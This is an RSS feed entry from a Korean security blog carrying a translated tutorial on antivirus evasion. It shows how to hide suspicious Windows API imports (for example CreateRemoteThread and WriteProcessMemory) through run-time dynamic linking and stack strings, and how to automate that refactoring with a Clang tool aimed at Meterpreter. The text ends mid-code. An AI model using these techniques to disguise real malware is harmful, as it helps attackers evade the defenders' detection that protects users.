<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sun, 13 Dec 2020 04:22:39 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Translation] Engineering Antivirus evasion Part.2</title>
      <link>https://hackyboiz.github.io/2020/12/13/idioth/av_evasion_part2/</link>
      <guid>https://hackyboiz.github.io/2020/12/13/idioth/av_evasion_part2/</guid>
      <pubDate>Sun, 13 Dec 2020 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;저번에 올렸던 Engineering Antivirus evasion를 이어서 Part 2의 번역본도 들고 왔습니다.&lt;/p&gt;
&lt;p&gt;저번의 발 번역에 이어서 이번에도 의역과 오역이 난무하는 글이므로 글이 이해가 안 되시거나 얘가 왜 이렇게 썼는지 이</description>
        
      
      
      
      <content:encoded><![CDATA[<p>저번에 올렸던 Engineering Antivirus evasion를 이어서 Part 2의 번역본도 들고 왔습니다.</p><p>저번의 발 번역에 이어서 이번에도 의역과 오역이 난무하는 글이므로 글이 이해가 안 되시거나 얘가 왜 이렇게 썼는지 이해가 안 되시는 부분이 있으시면 바로 지적해주시기 바랍니다!</p><blockquote><p>원문글 : <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">Engineering antivirus evasion (Part II)</a></p></blockquote><p><strong>tl;dr</strong> 소프트웨어는 Windows 운영 체제와 상호 작용하기 위해 동적 링크 라이브러리(DLL)를 통해 함수를 가져온다. 이 함수들은 Import Address Table 테이블에 평문으로 작성되고 안티바이러스 소프트웨어는 이를 활용하여 악의적인 활동을 탐지한다. 우리는 Meterpreter를 중심으로 C/C++ 소프트웨어를 refactoring 하여 이러한 footprint를 제거할 수 있는 난독화 아이디어와 구현을 보여준다. 소스 코드는 <a href="https://github.com/scrt/avcleaner">https://github.com/scrt/avcleaner</a>에서 확인할 수 있다.</p><h2 id="소개"><a href="#소개" class="headerlink" title="소개"></a>소개</h2><p>이전 글에서 정규식을 사용하지 않고 소스 코드에서 문자열 리터럴을 바꾸는 방법을 보여줬다. 바이너리의 footprint를 줄이고 정적 시그니처에 의존하는 보안 소프트웨어를 우회하는 것이 목적이다.</p><p>그러나 소스 코드의 문자열 리터럴 말고도 정적으로 수집하고 분석할 수 있는 정보들이 많다. 이 글은 바이너리에서 API import를 숨기는 방법과 C/C++로 작성된 모든 소프트웨어에서 그 작업을 자동화하는 방법에 대해서 다룰 것이다.</p><h2 id="API-imports의-문제점"><a href="#API-imports의-문제점" class="headerlink" title="API imports의 문제점"></a>API imports의 문제점</h2><p>간단한 C 프로그램을 아래와 같이 작성하고 빌드하자</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;     MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>그리고 가장 좋아하는 컴파일러로 빌드해라. MinGW는 <em>macOS</em>에서 <em>Windows</em>로 크로스 빌드를 하는 데 사용된다.</p><pre><code class="hljs bash">x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe</code></pre><p>그 후에 rabin2(radare2에 포함되어 있음) 또는 GNU strings 유틸리티를 사용하여 문자열을 리스트 할 수 있다.</p><pre><code class="hljs bash">rabin2 -zz /tmp/toto.exe | bat</code></pre><pre><code class="hljs bash"> 205   │ 201  0x00003c92 0x00408692 7   8    .idata        ascii   strncmp 206   │ 202  0x00003c9c 0x0040869c 8   9    .idata        ascii   vfprintf 207   │ 203  0x00003ca8 0x004086a8 11  12   .idata        ascii   MessageBoxA 208   │ 204  0x00003d10 0x00408710 12  13   .idata        ascii   KERNEL32.dll 209   │ 205  0x00003d84 0x00408784 10  11   .idata        ascii   msvcrt.dll 210   │ 206  0x00003d94 0x00408794 10  11   .idata        ascii   USER32.dll...9557   │ 9553 0x0004f481 0x00458e81 30  31                 ascii   .refptr.__native_startup_state9558   │ 9554 0x0004f4a0 0x00458ea0 11  12                 ascii   __ImageBase9559   │ 9555 0x0004f4ac 0x00458eac 11  12                 ascii   MessageBoxA9560   │ 9556 0x0004f4b8 0x00458eb8 12  13                 ascii   GetLastError9561   │ 9557 0x0004f4c5 0x00458ec5 17  18                 ascii   __imp_MessageBoxA9562   │ 9558 0x0004f4d7 0x00458ed7 23  24                 ascii   GetSystemTimeAsFileTime9563   │ 9559 0x0004f4ef 0x00458eef 22  23                 ascii   mingw_initltssuo_force9564   │ 9560 0x0004f506 0x00458f06 19  20                 ascii   __rt_psrelocs_start</code></pre><p>이 함수를 <code>User32.dll</code> 라이브러리에서 가져와야 하므로 MessageBoxA 문자열은 3번 나타난다.(뒤에서 자세히 설명)</p><p>MessageBoxA 문자열은 안티바이러스에서 감지되지 않지만 다음 API들은 감지될 것이다.</p><ul><li>InternetReadFile</li><li>ShellExecute</li><li>CreateRemoteThread</li><li>OpenProcess</li><li>ReadProcessMemory</li><li>WriteProcessMemory</li><li>…</li></ul><h2 id="API-imports-숨기기"><a href="#API-imports-숨기기" class="headerlink" title="API imports 숨기기"></a>API imports 숨기기</h2><p>윈도우 시스템에서 개발자들이 외부 라이브러리 함수를 호출하는 데 사용할 수 있는 방법들은 다음과 같다.</p><ul><li>Load-time dynamic linking</li><li>Run-time dynamic linking</li></ul><h3 id="Load-time-dynamic-linking"><a href="#Load-time-dynamic-linking" class="headerlink" title="Load-time dynamic linking"></a>Load-time dynamic linking</h3><p>외부 라이브러리 함수를 호출하는 기본적인 방법이며 링커에 의해 자동적으로 처리된다. 빌드 사이클 동안 애플리케이션은 각 동적 링크 라이브러리(DLL)의 import library(.lib)에 연결된다. 가져온 각 함수에 대해 링커는 DLL에 대한 내용을 IAT에 엔트리를 작성한다.</p><p>애플리케이션이 시작될 때, 운영체제는 IAT를 탐색하여 프로세스의 주소 공간에 있는 모든 라이브러리 리스트를 매핑하고 가져온 각 함수의 주소는 DLL의 Export Address Table에 해당 엔트리를 가리키도록 업데이트된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/0.png"></p><p>Import Address Table (IAT)</p><h3 id="Run-time-dynamic-linking"><a href="#Run-time-dynamic-linking" class="headerlink" title="Run-time dynamic linking"></a>Run-time dynamic linking</h3><p>다른 방법은 LoadLibrary로 해당 라이브러리를 로드한 후 GetProcAddress로 함수의 주소를 얻어 수동적으로 수행하는 것이다. 예를 들어 위의 예시를 run-time dynamic linking을 적용할 수 있다.</p><p>먼저 MessageBoxA API의 함수 포인터를 정의해야 한다. 시작하기 전에 C의 함수 포인터 구문에 대해 간단하게 설명한다.</p><pre><code class="hljs cpp">&lt;<span class="hljs-keyword">return</span> type&gt; (*&lt;your pointer name&gt;)(arg1, arg2, ...);</code></pre><p>볼 수 있듯이 star operator(함수 포인터이므로)와  괄호를 제외하면 함수를 정의하는 구문과 같다.</p><p>이제 MessageBox의 프로토타입이 필요한데 Windows SDK의 <code>winuser.h</code> 혹은 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>에서 찾을 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MessageBox</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>앞서 말한 함수 포인터 구문은 정확한 정보로 업데이트할 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> (*_MessageBoxA)(    HWND hWnd,    LPCTSTR lpText,    LPCTSTR lpCaption,    UINT uType);</code></pre><p>MSDN은 이 함수가 <code>User32.dll</code>에서 내보내진 다고 설명한다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/1.png"></p><p>MessageBoxA API는 <code>User32.dll</code>에서 내보내 진다. 따라서 애플리케이션은 이 라이브러리를 먼저 로드해야 한다.</p><pre><code class="hljs cpp">HANDLE hUser32 = LoadLibrary(<span class="hljs-string">&quot;User32.dll&quot;</span>);</code></pre><p>그 후 <code>GetProcAddress</code>를 사용하여 위에서 정의한 함수 포인터에 정확한 주소를 할당할 수 있다.</p><pre><code class="hljs cpp">_MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);</code></pre><p>여기서 원래 예를 <code>MessageBoxA</code> 대신 <code>fMessageBoxA</code>를 호출하도록 수정해야 하며 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    HANDLE hUser32 = LoadLibraryA(<span class="hljs-string">&quot;User32.dll&quot;</span>);    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>HWND, LCTSTR, UINT</code> 데이터 타입을 위해 <code>Windows.h</code> include가 필요하다. 이 간단한 예제를 빌드하고 실행하면 예상대로 alert box가 실행된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/2.png"></p><p>run-time dynamic linking을 하기 위해 <code>LoadLibrary</code>와 <code>GetProcAddress</code>을 사용하는 간단한 예시</p><h3 id="최종-적용"><a href="#최종-적용" class="headerlink" title="최종 적용"></a>최종 적용</h3><p><code>strings toto.exe</code>를 실행하면 아직 <code>User32.dll</code>과 <code>MessageBoxA</code> 문자열이 나타난다. 이 문자열들은 암호화되어야 하지만 이전 글에서 보여준 간단한 난독화 트릭으로 안티바이러스 탐지를 우회할 수 있다. 최종 결과는 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span class="hljs-keyword">char</span> user32[] = &#123;<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hUser32 = LoadLibraryA(user32);    <span class="hljs-keyword">char</span> messabox[] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, messabox);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>이번에는 <code>strings</code>와 <code>rabin2</code> 둘 다 문자열을 찾을 수 없다.</p><pre><code class="hljs cpp">➜  x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe➜  strings /tmp/toto.exe | grep MessageBox➜  rabin2 -zz /tmp/toto.exe | grep MessageBox➜</code></pre><h2 id="자동화된-소스-코드-리팩터링"><a href="#자동화된-소스-코드-리팩터링" class="headerlink" title="자동화된 소스 코드 리팩터링"></a>자동화된 소스 코드 리팩터링</h2><p>이전 글에 설명된 것과 같은 방법으로 기존 코드 베이스를 refactoring 하여 의심스러운 API를 런타임에 로드하고 Import Address Table에서 제거할 수 있다. <code>libTooling</code>으로 구현된 기존의 작업을 기반으로 할 것이다.</p><p>이 작업을 다음과 같이 나열해보자.</p><ul><li>이전 예제의 추상 구문 트리를 생성해라. 함수 호출을 수정하기 위해 노드를 조작하는 방법을 이해하는데 필요하다.</li><li><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>를 사용하여 지정된 API에 대한 API 코드 베이스의 모든 함수 호출을 찾아라.</li><li>다른 함수 식별자로 모든 호출을 대체해라.</li><li>각 함수 호출 전에 <code>LoadLibrary/GetProcAddress</code> 호출을 삽입하라.</li><li>작동하는지 확인해라.</li><li>모든 의심스러운 API를 종합하고 난독화해라.</li></ul><h3 id="MessageBox-애플리케이션의-추상-구문-트리"><a href="#MessageBox-애플리케이션의-추상-구문-트리" class="headerlink" title="MessageBox 애플리케이션의 추상 구문 트리"></a>MessageBox 애플리케이션의 추상 구문 트리</h3><p>원본 MessageBox 애플리케이션의 Clang 추상 구문 트리를 보기 위해 당신의 Windows SDK 경로를 적용하여 스크립트를 사용하자</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/dev/avcleaner&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><pre><code class="hljs bash">bash clang-astdump.sh <span class="hljs-built_in">test</span>/messagebox_simple.c &gt; <span class="hljs-built_in">test</span>/messagebox_simple.c.ast</code></pre><p><img src="/2020/12/13/idioth/av_evasion_part2/3.png"></p><p>MessageBoxA API를 호출하는 간단한 애플리케이션의 Clang 추상 구문 트리</p><p>CallExpr 유형의 AST 노드를 찾으면 소스 코드에서의 함수 호출을 찾을 수 있다. 위 사진에 나와있는 것처럼 실제 호출되는 함수 이름은 하위 노드 중 하나에 지정되어 있으므로 나중에 접근할 수 있어야 한다.</p><h3 id="특정-API의-함수-호출-찾기"><a href="#특정-API의-함수-호출-찾기" class="headerlink" title="특정 API의 함수 호출 찾기"></a>특정 API의 함수 호출 찾기</h3><p><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>는 특정 함수에 대한 모든 함수 호출을 열거하는데 필요하다. 우선 이전 글에서 사용된 것보다 더 복잡하므로 이 matcher에 맞는 구문을 얻는 것이 중요하다. 적합한 것을 찾기 위해서 소스 코드에서 custom query를 실행할 수 있는 interactive tool인 <code>clang-query</code>를 사용했다. 흥미롭게도 이것은 libTooling 기반이고 이 글에서 보여준 어떤 것보다 훨씬 강력하다.</p><pre><code class="hljs bash">clang-query&gt; match callExpr(callee(functionDecl(hasName(<span class="hljs-string">&quot;MessageBoxA&quot;</span>))))Match <span class="hljs-comment">#1:</span>/Users/vladimir/dev/scrt/avcleaner/<span class="hljs-built_in">test</span>/messagebox_simple.c:6:5: note: <span class="hljs-string">&quot;root&quot;</span> binds here    MessageBoxA(NULL, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~1 match.clang-query&gt;</code></pre><p>시행착오와 명령 줄 완성(tab completion)으로 빠르게 작업 솔루션에 접근할 수 있었다. matcher가 잘 동작하는 것을 확인했으니 이전 글에서 수행한 것과 같은 새로운 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>를 생성할 수 있다. <code>clang-query</code>를 사용하여 수행한 것을 C++ 재현하는 것이다.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiCallConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    ApiCallConsumer(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiName, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeDef, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Library)            : _ApiName(<span class="hljs-built_in">std</span>::move(ApiName)), _TypeDef(<span class="hljs-built_in">std</span>::move(TypeDef)), _Library(<span class="hljs-built_in">std</span>::move(Library)) &#123;&#125;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;                <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> AVObfuscator;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[ApiCallObfuscation] Registering ASTMatcher for &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">ApiMatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter, _ApiName, _TypeDef, _Library)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = callExpr(callee(functionDecl(hasName(_ApiName)))).bind(<span class="hljs-string">&quot;callExpr&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;<span class="hljs-keyword">private</span>:    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _ApiName;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _TypeDef;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _Library;&#125;;</code></pre><p>중요한 구현 세부 사항은 많은 다른 함수들에 적용할 수 있는 가능성을 제공하는 것이고 최종적인 목표는 각 수정된 API 함수에 <code>LoadLibrary/GetProcAddress</code>를 삽입하는 것이므로 함수 프로토타입과 DLL 이름을 제공해야 한다.</p><p>그렇게 하면 수정할 API만큼 많은 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumers</a>를 등록할 수 있다. 이 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>의 인스턴스화는 <a href="https://clang.llvm.org/doxygen/classclang_1_1FrontendAction.html">ASTFrontendAction</a>에서 수행되야만 한다:</p><p><img src="/2020/12/13/idioth/av_evasion_part2/4.png"></p><p><code>main.cpp</code>의 주요 변경점.</p><p>이것은 이전 글에서 작업한 기존 코드에 대한 유일한 변경점이다. 우리가 추가할 코드들은 <code>ApiMatchHandelr.cpp</code>를 만드는 것부터 시작한다.</p><p>matcher는 콜백 함수와 함께 제공되므로 다음 하나를 제공하자.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ApiMatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Found &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *CallExpression = Result.Nodes.getNodeAs&lt;clang::CallExpr&gt;(<span class="hljs-string">&quot;callExpr&quot;</span>);    handleCallExpr(CallExpression, Result.Context);&#125;</code></pre><p>섹션의 시작 부분에서 리스트로 분리된 작업들은 아래 메소드를 통해 코드로 바꿀 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span></span>;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span></span>;<span class="hljs-keyword">bool</span>addGetProcAddress(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,                    <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName);<span class="hljs-function">clang::SourceRange <span class="hljs-title">findInjectionSpot</span><span class="hljs-params">(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> clang::CallExpr &amp;Literal, <span class="hljs-keyword">uint64_t</span> Iterations)</span></span>;</code></pre><h3 id="함수-호출-대체"><a href="#함수-호출-대체" class="headerlink" title="함수 호출 대체"></a>함수 호출 대체</h3><p>이것은 가장 사소한 부분이다. 목표는 AST의 <code>MessageBoxA</code>를 무작위 식별자로 대체하는 것이다. 이러한 무작위 변수 초기화는 다음 섹션에서 수행된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span> </span>&#123;    <span class="hljs-comment">// generate a random variable name</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = Utils::translateStringToIdentifier(_ApiName);    <span class="hljs-comment">// inject Run-time dynamic linking</span>    <span class="hljs-keyword">if</span> (!addGetProcAddress(CallExpression, pContext, Replacement, _ApiName))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">// MessageBoxA -&gt; random identifier generated above</span>    <span class="hljs-keyword">return</span> replaceIdentifier(CallExpression, _ApiName, Replacement);&#125;</code></pre><p><a href="https://clang.llvm.org/doxygen/Rewriter_8h_source.html#l00164">ReplaceText</a> Clagn API는 함수 식별자의 이름을 변경하는 데 사용된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;ASTRewriter-&gt;ReplaceText(CallExpression-&gt;getBeginLoc(), ApiName.length(), NewIdentifier);&#125;</code></pre><h3 id="LoadLibrary-GetProcAddress-삽입"><a href="#LoadLibrary-GetProcAddress-삽입" class="headerlink" title="LoadLibrary/GetProcAddress 삽입"></a>LoadLibrary/GetProcAddress 삽입</h3><p>우리가 추가하고자 하는 API에 Run-time dynamic linking을 추가하는 과정은 다음과 같다:</p><ul><li><p>translation unit의 상단 혹은 enclosing 함수 안에 API 프로토타입을 추가해라. 쉽게 하기 위해 우리는 후자를 선택하지만 동일한 함수에서 API를 여러 번 호출할 경우 이미 추가되었는지 확인할 필요가 있다.</p></li><li><p>아래 라인을 추가해라</p><p>  <code>HANDLE &lt;random identifier&gt; LoadLibrary(&lt;library name&gt;);</code></p></li><li><p><code>GetProcAddress</code> 호출을 추가해라</p></li></ul><p>물론 이 작업을 하면서 문자열 리터럴을 삽입하지 않기 위해 각 문자열을 스택 문자열로 작성해야 한다. 이것은 코드를 읽기 지루하게 만들지만 복잡하진 않다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::addGetProcAddress</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName)</span> </span>&#123;    SourceRange EnclosingFunctionRange = findInjectionSpot(pContext, clang::ast_type_traits::DynTypedNode(),                                                           *pCallExpression, <span class="hljs-number">0</span>);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">stringstream</span> Result;    <span class="hljs-comment">// add function prototype if not already added</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">std</span>::find(TypedefAdded.begin(), TypedefAdded.end(), pCallExpression-&gt;getDirectCallee()) == TypedefAdded.end()) &#123;        Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; _TypeDef &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125; 